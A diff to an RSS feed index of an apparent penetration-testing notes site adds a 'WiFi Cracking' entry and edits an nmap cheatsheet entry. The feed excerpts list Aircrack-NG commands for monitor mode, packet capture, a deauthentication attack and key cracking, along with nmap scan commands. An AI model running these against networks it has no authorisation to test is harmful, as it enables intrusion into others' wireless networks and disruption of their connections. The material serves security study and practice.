@@ -257,6 +257,15 @@ Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ w
     </item>
     
     <item>
+      <title>WiFi Cracking</title>
+      <link>/wireless/wifi_cracking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/wireless/wifi_cracking/</guid>
+      <description>Aircrack-NG Suite # Turning on the monitor mode # We can not see packages from SSIDs that we are not associated with airmon-ng start wlan0** # Monitoring # We capture packages running: airodump-ng mon0** # Speeding up # We can launch a de-authentication attack to speed up the process: aireplay-ng -0 3 -a &amp;lt;macaddress of the ap&amp;gt; mon0** # Capturing packages airodump-ng mon0 --bssid –c (channel) –w (file name to save)** # Cracking the cap aircrack-ng RHAWEP-0.</description>
+    </item>
+    
+    <item>
       <title>Wordpress</title>
       <link>/web-attacks/content-management-system-cms/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -432,7 +441,7 @@ Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/recon-enumeration/port-scanning/nmap_cheatsheet/</guid>
-      <description>Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
+      <description>https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
     </item>
     
     <item>
